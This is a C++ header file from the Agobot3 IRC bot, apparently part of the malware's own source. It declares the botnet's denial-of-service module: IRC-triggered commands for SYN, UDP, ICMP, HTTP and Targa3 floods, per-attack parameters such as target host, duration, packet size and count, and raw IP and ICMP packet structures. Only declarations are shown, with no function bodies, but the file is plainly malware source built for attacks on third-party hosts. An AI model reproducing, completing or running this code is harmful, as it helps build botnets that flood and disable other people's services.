/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __DDOS_H__
#define __DDOS_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

#define FIN  0x01
#define SYN  0x02
#define RST  0x04
#define PUSH 0x08
#define ACK  0x10
#define URG  0x20

#define IP 0
#define ICMP 1
#define IGMP 2
#define TCP 6
#define UDP 17
#define RAW 255

#define ICMP_ECHOREPLY	0
#define ICMP_ECHO	8

class CDDOS : public CCommandHandler
{
public:
	void Init();

	bool HandleCommand(CMessage *pMsg);
	
	command		 m_cmdPing, m_cmdUDP, m_cmdSyn, m_cmdHTTP, m_cmdStop, 
				 m_cmdPhatSyn, m_cmdPhatICMP, m_cmdPhatWonk, m_cmdTarga3;
	int			 m_iNumThreads;
	bool		 m_bDDOSing;
};

class CDDOSBase : public CThread
{
public:
	CDDOSBase() { m_szType="CDDOSBase"; }
	virtual ~CDDOSBase() { }
	virtual void *Run();

	virtual void StartDDOS();

	CString		 m_sDDOSName;
	CString		 m_sReplyTo;

	CString		 m_sHost;		// The Host to DDOS
	int			 m_iTime;		// Number of seconds DDOS is running
	int			 m_iDelay;		// Packet Delay
	int			 m_iPort;		// Port number / 0 for random
	int			 m_iNumber;		// Number of Packets
	int			 m_iSize;		// Size of Packets
	CString		 m_sURL;		// URL for HTTP flood
	CString		 m_sReferrer;	// URL for HTTP flood referrer
	bool		 m_bRecursive;	// Recursive option for HTTP flood

	bool		 m_bSilent;
	bool		 m_bNotice;

	CDDOS		*m_pDDOS;
};

class CDDOSHTTPFlood : public CDDOSBase
{
public:
	CDDOSHTTPFlood();
	virtual void StartDDOS();
};

class CDDOSSynFlood : public CDDOSBase
{
public:
	CDDOSSynFlood();
	virtual void StartDDOS();
};

class CDDOSUDPFlood : public CDDOSBase
{
public:
	CDDOSUDPFlood();
	virtual void StartDDOS();
};

class CDDOSPhatSynFlood : public CDDOSBase
{
public:
	CDDOSPhatSynFlood();
	virtual void StartDDOS();
};

class CDDOSPhatICMPFlood : public CDDOSBase
{
public:
	CDDOSPhatICMPFlood();
	virtual void StartDDOS();
};

class CDDOSTarga3 : public CDDOSBase
{
public:
	CDDOSTarga3();
	virtual void StartDDOS();
};

class CDDOSPhatWonkFlood : public CDDOSBase
{
public:
	CDDOSPhatWonkFlood();
	virtual void StartDDOS();
};

typedef char s8;
typedef unsigned char u8;
typedef short int s16;
typedef unsigned short int u16;
typedef int s32;
typedef unsigned int u32;

struct iph
{
	unsigned char ihl:4;
	unsigned char version:4;
	unsigned char tos;
	unsigned short int tot_len;
	unsigned short int id;
	unsigned short int frag_off;
	unsigned char ttl;
	unsigned char protocol;
	unsigned short int check;
	unsigned int saddr;
	unsigned int daddr;
};

struct icmp
  {
    u8 type, code;
    u16 sum;
    u16 id, seq;
  };

#endif // __DDOS_H__
